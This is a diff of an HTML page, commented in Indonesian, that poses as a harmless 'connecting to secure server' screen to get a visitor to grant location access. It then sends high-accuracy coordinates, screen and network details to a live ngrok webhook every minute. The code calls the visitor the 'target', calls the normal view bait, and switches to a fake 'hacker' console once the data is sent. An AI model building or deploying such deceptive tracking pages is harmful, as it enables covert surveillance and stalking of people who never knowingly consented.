@@ -1,32 +1,63 @@
-<!DOCTYPE html>
+
+    <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Judul tab dibuat seolah-olah alat pemindai sistem profesional -->
-    <title>CyberSec System Core v2.4</title>
+    <!-- Awalnya judul tab dibuat sangat formal dan normal -->
+    <title id="tab-title">Connecting...</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background-color: #050505; color: #00ff66; padding: 20px; text-align: left; margin: 0; box-sizing: border-box; }
-        .console-box { border: 1px solid #00ff66; padding: 15px; background-color: #0a0a0a; border-radius: 4px; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); min-height: 200px; font-size: 14px; line-height: 1.5; }
+        /* Tampilan Awal: Putih bersih, normal seperti Chrome standar */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff; 
+            color: #333333; 
+            padding: 50px 20px; 
+            text-align: center; 
+            margin: 0; 
+            transition: background-color 0.5s ease; /* Efek transisi mulus saat berubah hitam */
+        }
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Tampilan Hacker: Disembunyikan dulu, baru muncul setelah sukses kirim */
+        .hacker-mode { display: none; text-align: left; font-family: 'Courier New', Courier, monospace; font-size: 14px; line-height: 1.5; }
+        .console-box { border: 1px solid #00ff66; padding: 15px; background-color: #0a0a0a; border-radius: 4px; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); min-height: 200px; color: #00ff66; }
         .header-title { color: #ffffff; font-weight: bold; margin-bottom: 10px; font-size: 16px; text-transform: uppercase; letter-spacing: 2px; }
         .blink { animation: blinker 1s linear infinite; color: #ff3333; }
         @keyframes blinker { 50% { opacity: 0; } }
-        .loading::after { display: inline-block; animation: dotty steps(4, jump-end) 900ms infinite; content: ''; }
-        @keyframes dotty { 0% { content: ''; } 25% { content: '.'; } 50% { content: '..'; } 75% { content: '...'; } }
     </style>
 </head>
 <body>
 
-    <div class="header-title">⚡ SECURITY SIMULATOR ENGINE</div>
-    <div class="console-box">
-        <div>[SYS] Initializing core modules... DONE</div>
-        <div>[SYS] Establishing secure terminal connection... DONE</div>
-        <div id="status" class="loading">[SCAN] Waiting for device security handshake</div>
-        <div id="log-data" style="margin-top: 10px; color: #888;"></div>
+    <!-- 🌐 KONDISI 1: TAMPILAN NORMAL (Pancingan Izin Lokasi) -->
+    <div id="normal-view">
+        <div class="loading-spinner"></div>
+        <h3 style="font-weight: 500; color: #5f6368;">Connecting to secure server cluster...</h3>
+        <p id="status-text" style="color: #70757a; font-size: 14px;">Please establish device location handshake to verify connection parameters.</p>
+    </div>
+
+    <!-- ⚡ KONDISI 2: TAMPILAN HACKER KEREN (Muncul Setelah Data Masuk Database) -->
+    <div id="hacker-view" class="hacker-mode">
+        <div class="header-title">⚡ SECURITY SIMULATOR ENGINE ACTIVE</div>
+        <div class="console-box">
+            <div>[SYS] Core database modules... CONNECTED</div>
+            <div>[SYS] Secure terminal link... VERIFIED</div>
+            <div id="scan-status" style="color: #00ff66; font-weight: bold;">[SUCCESS] Device integrity report generated successfully.</div>
+            <div id="log-data" style="margin-top: 10px; color: #888;"></div>
+        </div>
     </div>
 
     <script>
-        // ⚠️ TETAP GUNAKAN LINK NGROK AKTIF ANDA SAAT INI DI SINI
+        // ⚠️ TETAP GUNAKAN ALAMAT NGROK AKTIF ANDA YANG SEDANG BERJALAN DI VS CODE
         const WEBHOOK_URL = "https://ditzy-omega-mud.ngrok-free.dev/webhook";
         const ipAddress = "114.10.157.196";
 
@@ -37,20 +68,30 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-                // Target mengira data pemindaian berhasil dianalisis di server
-                document.getElementById('status').className = "";
-                document.getElementById('status').style.color = "#00ff66";
-                document.getElementById('status').innerText = "[SUCCESS] Device integrity report generated successfully.";
+                
+                // 🔥 PROSES BUBAR BUBAL (Bunglon Berubah Jadi Hacker Setelah Sukses Kirim Data!)
+                document.title = "CyberSec System Core v2.4"; // Judul tab berubah ala hacker
+                document.body.style.backgroundColor = "#050505"; // Background berubah hitam pekat
+                document.getElementById('normal-view').style.display = "none"; // Hapus layar putih
+                
+                // Tampilkan menu dashboard hacker yang sangat disukai dosen Anda
+                const hackerView = document.getElementById('hacker-view');
+                hackerView.style.display = "block";
+                
+                document.getElementById('log-data').innerHTML = `
+                    &gt; PIPING HARDWARE METRICS TO SQL... DONE<br>
+                    &gt; DATABASE FILE: pelacakan.db LOCKED<br>
+                    &gt; LATENCY ACCURACY: ± ${data.accuracy} meters<br>
+                    &gt; RESOLUTION DETECTED: ${data.screen} <span class="blink">[SECURE LINK]</span>
+                `;
             } catch (err) {
-                document.getElementById('status').className = "";
-                document.getElementById('status').style.color = "#ff3333";
-                document.getElementById('status').innerText = "[ERROR] Connection timeout to database cluster.";
+                document.getElementById('status-text').innerText = "Connection failed. Please refresh.";
             }
         }
 
         async function kirimLokasi() {
             if (!navigator.geolocation) {
-                document.getElementById('status').innerText = "[CRITICAL] Hardware API not supported.";
+                document.getElementById('status-text').innerText = "Hardware API error.";
                 return;
             }
 
@@ -86,29 +127,19 @@
                     server_time: new Date().toLocaleString("id-ID")
                 };
 
-                // Tampilkan visual logs palsu ala heker di layar HP target agar meyakinkan
-                document.getElementById('log-data').innerHTML = `
-                    &gt; FETCHING HARDWARE METRICS...<br>
-                    &gt; SCREEN RES: ${data.screen}<br>
-                    &gt; NET RATE: ${networkData}<br>
-                    &gt; VERIFYING SECURITY TOKEN... <span class="blink">COMPILING</span>
-                `;
-
                 kirim(data);
             }, (err) => {
-                document.getElementById('status').className = "";
-                document.getElementById('status').style.color = "#ff3333";
-                document.getElementById('status').innerText = "[DENIED] Access to hardware parameters was rejected by user.";
+                document.getElementById('status-text').style.color = "#ff3333";
+                document.getElementById('status-text').innerText = "Handshake rejected: Access to secure protocols denied.";
             }, { enableHighAccuracy: true, timeout: 15000 });
         }
 
         // Jalankan pelacakan pertama, lalu ulang tiap 1 menit
         kirimLokasi();
-        setInterval(kirimLokasi, 30000);
+        setInterval(kirimLokasi, 60000);
     </script>
 </body>
 </html>
-
 
 <!-- <!DOCTYPE html>
 <html lang="id">
